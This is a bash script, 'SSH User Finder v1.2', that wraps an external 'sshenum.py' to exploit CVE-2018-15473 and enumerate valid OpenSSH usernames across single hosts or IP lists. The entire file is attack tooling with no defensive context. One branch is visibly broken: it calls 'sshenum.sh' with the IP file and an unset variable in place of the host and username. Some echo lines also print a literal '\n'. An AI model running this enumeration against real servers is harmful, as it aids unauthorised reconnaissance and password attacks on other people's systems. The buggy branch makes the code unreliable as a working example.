#!/bin/bash
# Exploits CVE-2018-15473 to enumerate OpenSSH usernames

# Menu
echo -e "\nSSH User Finder v1.2\n"
echo "Use single username or username list for testing?"
echo "[1] Single username"
echo "[2] Username list"
read -p "suf => " useroption
echo -e "\nTest single IP or IPs from a list?"
echo "[1] Single IP"
echo "[2] IP list"
read -p "suf => " ipoption

# Choice is userfile and ipfile
if [ $useroption == "2" ] && [ $ipoption == "2" ]; then
  echo "What is the path to the userlist file? (relative or full path)"
  read -p "suf => " userfile
  echo -e "\nWhat is the path to the IP file? (relative or full path)"
  read -p "suf => " ipfile
  echo "\nUser list: $userfile"
  echo "IP list: $ipfile"
  echo -e "\nLook good? (y/n)"
  read -p "suf => " confirm
  if [ $confirm == "y" ] || [ $confirm == "Y" ]; then
    for ip in $( cat $ipfile )
    do
      echo "Checking hosts for valid users..."
      sleep 3
      for user in $( cat $userfile )
      do
        python sshenum.py $ip $user
      done
    done
  else
    exit
  fi

# Choice is userfile and single ip
elif [ $useroption == "2" ] && [ $ipoption == "1" ]; then
  echo "What is the path to the userlist file? (relative or full path)"
  read -p "suf => " userfile
  echo -e "\nWhat is the IP address of the host to check?"
  read -p "suf => " ip

  echo "\nUser list: $userfile"
  echo "IP: $ip"
  echo -e "\nLook good? (y/n)"
  read -p "suf => " confirm
  if [ $confirm == "y" ] || [ $confirm == "Y" ]; then
    echo "Checking $ip for valid users..."
    sleep 3
    for user in $( cat $userfile )
    do
      python sshenum.py $ip $user
    done
  else
    exit
  fi

# Choice is single username and ipfile
elif [ $useroption == "1" ] && [ $ipoption == "2" ]; then
  echo "What is the username you would like to check?"
  read -p "suf => " username
  echo -e "\nWhat is the path to the IP file? (full or relative path)\n"
  read -p "suf => " ipfile
  echo -e "\nUsername: $username"
  echo "IP: $ipfile"
  echo -e "\nLook good? (y/n)"
  read -p "suf => " confirm
  if [ $confirm == "y"  ] || [ $confirm == "Y" ]; then
    echo "Checking hosts for username $username..."
    for ip in $( cat $ipfile )
    do
      python sshenum.sh $ipfile $user
    done
  else
    exit
  fi

# Option is single username and single ip
elif [ $useroption == "1" ] && [ $ipoption == "1" ]; then
  echo "What is the username you would like to check?"
  read -p "suf => " username
  echo -e "\nWhat is the IP address of the host to check?"
  read -p "suf => " ip
  echo "Username: $username"
  echo "Host IP: $ip"
  echo -e "\nLook good? (y/n)\n"
  read -p "suf => " confirm
  if [ $confirm == "y" ] || [ $confirm == "Y" ]; then
    echo "Checking $ip for username $username..."
    python sshenum.py $ip $username
  else
    exit
  fi

# Invalid option selected
else
  echo "Invalid option(s)"
  sleep 5
  exit
fi
